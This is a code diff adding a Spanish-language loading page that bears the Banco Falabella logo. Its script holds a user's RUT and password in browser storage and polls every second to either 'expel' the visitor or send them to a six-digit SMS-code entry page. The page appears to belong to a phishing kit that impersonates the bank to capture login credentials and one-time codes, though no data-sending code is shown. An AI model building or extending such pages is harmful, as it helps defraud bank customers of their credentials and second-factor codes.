@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Pantalla de Carga</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    img {
+      width: 120px;
+      max-width: 40vw;
+      margin-bottom: 30px;
+    }
+
+    .loader {
+      width: 35px;
+      height: 35px;
+      border-radius: 50%;
+      border: 4px solid #3baf3c;          /* borde verde */
+      border-right-color: transparent;     /* ocultamos solo 1 segmento */
+      animation: girar 0.8s linear infinite;
+    }
+
+    @keyframes girar {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <img src="https://www.bancofalabella.cl/_next/static/media/logo.686cc6de.svg" alt="Logo">
+  <div class="loader"></div>
+
+  <script>
+    const rut = localStorage.getItem("rutUsuario");
+
+    function revisarExpulsion() {
+      let usuarios = JSON.parse(localStorage.getItem("usuarios")) || [];
+      const usuario = usuarios.find(u => u.rut === rut);
+
+      if (usuario && usuario.expulsado === true) {
+        usuarios = usuarios.filter(u => u.rut !== rut);
+        localStorage.setItem("usuarios", JSON.stringify(usuarios));
+        localStorage.removeItem("rutUsuario");
+        localStorage.removeItem("claveUsuario");
+        localStorage.removeItem("sesionIniciada");
+        window.location.href = "index.html";
+      }
+    }
+
+    function revisarRedireccionSMS() {
+      const esperandoSMS = localStorage.getItem("esperandoSMS");
+
+      if (esperandoSMS && esperandoSMS === rut) {
+        localStorage.removeItem("esperandoSMS");
+        window.location.href = "../Codigo-sms/ingresar-6-digitos.html";
+      }
+    }
+
+    setInterval(() => {
+      revisarExpulsion();
+      revisarRedireccionSMS();
+    }, 1000);
+  </script>
+
+</body>
+</html>
